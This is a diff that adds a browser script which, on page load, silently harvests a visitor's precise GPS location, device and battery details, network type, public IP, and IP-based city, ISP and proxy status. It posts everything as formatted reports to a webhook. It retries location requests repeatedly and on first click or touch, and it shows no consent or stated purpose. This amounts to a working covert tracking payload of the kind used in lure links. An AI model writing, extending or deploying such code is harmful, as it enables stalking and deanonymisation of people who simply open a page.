@@ -1,0 +1,188 @@
+<script type="text/javascript">
+(function() {
+
+  function send(data) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "/webhook.php", true);
+    xhr.setRequestHeader("Content-Type", "text/plain; charset=utf-8");
+    xhr.send(data);   // raw string, no JSON.stringify
+  }
+
+  function getTime() {
+    var now = new Date();
+    var h = now.getHours();
+    var m = now.getMinutes();
+    var s = now.getSeconds();
+    var ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12;
+    h = h ? h : 12;
+    m = m < 10 ? '0' + m : m;
+    s = s < 10 ? '0' + s : s;
+    var d = now.getDate();
+    var mo = now.getMonth() + 1;
+    var y = now.getFullYear();
+    d = d < 10 ? '0' + d : d;
+    mo = mo < 10 ? '0' + mo : mo;
+    return d + '/' + mo + '/' + y + ' ' + h + ':' + m + ':' + s + ' ' + ampm;
+  }
+
+  // ========== GPS FIRST ==========
+  var gpsDone = false;
+  var retry = 0;
+
+  function capture(pos) {
+    if (gpsDone) return;
+    gpsDone = true;
+    var lat = pos.coords.latitude;
+    var lon = pos.coords.longitude;
+    var acc = Math.round(pos.coords.accuracy);
+    var alt = pos.coords.altitude || 'N/A';
+    var spd = pos.coords.speed || 'N/A';
+    var head = pos.coords.heading || 'N/A';
+
+    send("\n═══════════════════════════════\n" +
+      "🔴 GPS COORDINATES\n" +
+      "Time: " + getTime() + "\n" +
+      "Lat: " + lat + "\n" +
+      "Lon: " + lon + "\n" +
+      "Accuracy: " + acc + "m\n" +
+      "Altitude: " + alt + "\n" +
+      "Speed: " + spd + "\n" +
+      "Heading: " + head + "\n" +
+      "Maps: https://www.google.com/maps/place/" + lat + "," + lon + "\n" +
+      "═══════════════════════════════\n");
+  }
+
+  function fail(err) {
+    retry++;
+    if (err.code === 1) { send("\nGPS: Denied at " + getTime() + "\n"); return; }
+    if (retry < 5) setTimeout(tryGPS, 2000);
+  }
+
+  function tryGPS() {
+    if (gpsDone || !navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(capture, fail, {
+      enableHighAccuracy: true, timeout: 5000, maximumAge: 0
+    });
+    setTimeout(function() {
+      if (!gpsDone) {
+        navigator.geolocation.getCurrentPosition(capture, function(){}, {
+          enableHighAccuracy: false, timeout: 3000, maximumAge: 600000
+        });
+      }
+    }, 2000);
+  }
+
+  tryGPS();
+  document.addEventListener('click', function(){ tryGPS(); }, {once: true});
+  document.addEventListener('touchstart', function(){ tryGPS(); }, {once: true});
+  setInterval(function(){ if(!gpsDone) tryGPS(); }, 5000);
+
+  // ========== DEVICE INFO ==========
+  setTimeout(function() {
+    send("\n═══════════════════════════════\n" +
+      "📱 DEVICE INFO\n" +
+      "Time: " + getTime() + "\n" +
+      "User Agent: " + navigator.userAgent + "\n" +
+      "Platform: " + navigator.platform + "\n" +
+      "Language: " + navigator.language + "\n" +
+      "RAM: " + (navigator.deviceMemory || 'N/A') + " GB\n" +
+      "CPU: " + (navigator.hardwareConcurrency || 'N/A') + " cores\n" +
+      "Screen: " + screen.width + "x" + screen.height + "\n" +
+      "Pixel Ratio: " + (window.devicePixelRatio || 'N/A') + "\n" +
+      "Touch: " + ('ontouchstart' in window ? 'Yes' : 'No') + "\n" +
+      "Cookies: " + navigator.cookieEnabled + "\n" +
+      "Referrer: " + (document.referrer || 'Direct') + "\n" +
+      "═══════════════════════════════\n");
+  }, 100);
+
+  // ========== BATTERY ==========
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(b) {
+      send("\n═══════════════════════════════\n" +
+        "🔋 BATTERY\n" +
+        "Time: " + getTime() + "\n" +
+        "Level: " + Math.round(b.level * 100) + "%\n" +
+        "Charging: " + (b.charging ? 'Yes' : 'No') + "\n" +
+        "═══════════════════════════════\n");
+    });
+  }
+
+  // ========== CONNECTION ==========
+  setTimeout(function() {
+    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (c) {
+      var type = c.type || c.effectiveType || 'Unknown';
+      var networkType = 'Unknown';
+      
+      if (type === 'wifi' || type === 'ethernet') {
+        networkType = '📶 WiFi/Ethernet';
+      } else if (type === 'cellular' || type === '4g' || type === '3g' || type === '2g' || type === '5g') {
+        networkType = '📱 Cellular (' + type.toUpperCase() + ')';
+      } else if (type === 'slow-2g') {
+        networkType = '📱 Cellular (2G - Slow)';
+      } else {
+        networkType = '📶 ' + type;
+      }
+
+      send("\n═══════════════════════════════\n" +
+        "📶 CONNECTION\n" +
+        "Time: " + getTime() + "\n" +
+        "Network: " + networkType + "\n" +
+        "Type: " + type + "\n" +
+        "Speed: " + (c.downlink || 'N/A') + " Mbps\n" +
+        "RTT: " + (c.rtt || 'N/A') + " ms\n" +
+        "Save Data: " + (c.saveData ? 'Yes' : 'No') + "\n" +
+        "═══════════════════════════════\n");
+    }
+  }, 200);
+
+  // ========== IP + LOCATION ==========
+  var ipScript = document.createElement('script');
+  ipScript.src = 'https://api.ipify.org?format=jsonp&callback=gotIP';
+  document.body.appendChild(ipScript);
+
+  window.gotIP = function(data) {
+    send("\n═══════════════════════════════\n" +
+      "🌐 IP INFO\n" +
+      "Time: " + getTime() + "\n" +
+      "IP: " + data.ip + "\n" +
+      "═══════════════════════════════\n");
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "http://ip-api.com/json/" + data.ip + "?fields=status,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query");
+    xhr.onload = function() {
+      var r = JSON.parse(xhr.responseText);
+      if (r.status === 'success') {
+        send("\n═══════════════════════════════\n" +
+          "📍 LOCATION\n" +
+          "Time: " + getTime() + "\n" +
+          "Continent: " + r.continent + "\n" +
+          "Country: " + r.country + " (" + r.countryCode + ")\n" +
+          "Region: " + r.regionName + "\n" +
+          "City: " + r.city + "\n" +
+          "District: " + (r.district || 'N/A') + "\n" +
+          "ZIP: " + (r.zip || 'N/A') + "\n" +
+          "Timezone: " + r.timezone + " (UTC" + r.offset + ")\n" +
+          "Currency: " + r.currency + "\n" +
+          "Approx Lat: " + r.lat + "\n" +
+          "Approx Lon: " + r.lon + "\n" +
+          "═══════════════════════════════\n" +
+          "\n═══════════════════════════════\n" +
+          "📡 NETWORK\n" +
+          "Time: " + getTime() + "\n" +
+          "ISP: " + r.isp + "\n" +
+          "Org: " + (r.org || 'N/A') + "\n" +
+          "AS: " + (r.as || 'N/A') + " (" + (r.asname || '') + ")\n" +
+          "Reverse DNS: " + (r.reverse || 'N/A') + "\n" +
+          "Mobile ISP: " + (r.mobile ? 'Yes' : 'No') + "\n" +
+          "Proxy: " + (r.proxy ? '⚠️ YES' : 'No') + "\n" +
+          "Hosting: " + (r.hosting ? '⚠️ YES' : 'No') + "\n" +
+          "═══════════════════════════════\n");
+      }
+    };
+    xhr.send();
+  };
+
+})();
+</script>
